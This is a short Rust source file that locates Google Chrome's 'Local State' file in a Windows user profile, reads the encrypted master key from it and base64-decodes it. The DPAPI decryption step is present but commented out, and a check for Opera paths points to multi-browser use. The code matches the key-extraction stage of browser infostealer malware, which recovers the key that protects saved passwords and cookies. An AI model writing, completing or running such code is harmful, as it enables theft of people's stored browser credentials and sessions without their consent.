use std::env;
use std::path::{Path, PathBuf};
use std::error::Error;
use std::fs;
use serde_json::Value;

pub fn chrome_master_key() -> Vec<u8>{
    let userprofile = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile.as_str()).join("AppData");

    let browser_target = "Local\\Google\\Chrome";

    let browser_dir = appdata_dir.join(browser_target);

    let user_data_dir = get_user_data_dir(&browser_dir).unwrap();
    let local_state_path = user_data_dir.join("Local State");
    let master_key = get_master_key(&local_state_path).unwrap();
    return master_key;
}

fn get_user_data_dir(browser_dir: &PathBuf) -> Result<PathBuf, Box<dyn Error>> {
    let mut user_data_dir = browser_dir.to_owned();

    if !browser_dir.to_string_lossy().contains("Opera Software") {
        user_data_dir = user_data_dir.join("User Data");
    }
    return Ok(user_data_dir);
}

pub fn get_master_key(master_key_path: &PathBuf) -> Option<Vec<u8>> {
    let contents = fs::read_to_string(master_key_path).ok()?;

    let json: Value = serde_json::from_str(contents.as_str()).ok()?;

    if let Some(encrypted_key) = json["os_crypt"]["encrypted_key"].as_str() {
        let plain_text = base64::decode(encrypted_key).ok()?[5..].to_vec();
        //let master_key = dpapi_decrypt(plain_text);
        //return Some(master_key);
        return Some(plain_text);
    }
    return None;
}